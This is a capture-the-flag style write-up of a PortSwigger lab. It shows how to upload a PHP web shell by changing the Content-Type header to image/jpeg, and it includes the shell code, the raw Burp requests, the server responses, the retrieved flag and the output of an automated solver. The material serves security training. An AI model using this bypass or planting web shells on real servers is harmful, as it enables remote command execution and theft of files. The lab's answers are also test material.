# Lab: Web shell upload via Content-Type restriction bypass

### Instructions

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

We can begin this lab by first creating a simple webshell to issue commands and read the flag:

```php
<?php system('cat /home/carlos/secret'); ?>
```
This can be saved as flag.php.

Attempting to load the php file as is for the user avatar picture we get the following error:

```
Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
```

Capturing this POST in Burp we see the Content-Type being assigned:

```
POST /my-account/avatar HTTP/1.1
Host: 0a5c007d04ea78c883d90f41001c00ac.web-security-academy.net
Cookie: session=TlZxenfKABFJlhb89LEMJ8OsfeJ9Pi9q
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------17799303541599563822526676470
Content-Length: 527
Origin: https://0a5c007d04ea78c883d90f41001c00ac.web-security-academy.net
Referer: https://0a5c007d04ea78c883d90f41001c00ac.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

-----------------------------17799303541599563822526676470
Content-Disposition: form-data; name="avatar"; filename="flag.php"
Content-Type: application/x-php

<?php system('cat /home/carlos/secret'); ?>

-----------------------------17799303541599563822526676470
Content-Disposition: form-data; name="user"

wiener
-----------------------------17799303541599563822526676470
Content-Disposition: form-data; name="csrf"

3eW6PyMiSfXRr406dApSiDkoHskmx8Ih
-----------------------------17799303541599563822526676470--
```

We can manually modify this to `image/jpeg` in the Burp request:

```
-----------------------------17799303541599563822526676470
Content-Disposition: form-data; name="avatar"; filename="flag.php"
Content-Type: image/jpeg

<?php system('cat /home/carlos/secret'); ?>

-----------------------------17799303541599563822526676470
Content-Disposition: form-data; name="user"

wiener
-----------------------------17799303541599563822526676470
Content-Disposition: form-data; name="csrf"

3eW6PyMiSfXRr406dApSiDkoHskmx8Ih
-----------------------------17799303541599563822526676470--
```

Which successfully is loaded:

```
HTTP/2 200 OK
Date: Mon, 19 Oct 2026 18:16:27 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 129

The file avatars/flag.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
We can then right click on our loaded "image" and open it at: `https://0a5c007d04ea78c883d90f41001c00ac.web-security-academy.net/files/avatars/flag.php`

Which reveals the flag:

```
sTuk46T7wCkOM0Ti3tB2ZszoE6vZqerL
```

This can be submitted and solves the lab.

### Python Solution

See `file_upload_02.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_02_web_shell_upload_via_content-type_restriction_bypass]
└─$ python file_upload_02.py https://0a5c007d04ea78c883d90f41001c00ac.web-security-academy.net/
[+] Logged in as wiener
[+] File uploaded
[+] The lab's flag is: sTuk46T7wCkOM0Ti3tB2ZszoE6vZqerL
[*] Submitting flag to solve lab...
[+] Successfully submitted the flag

```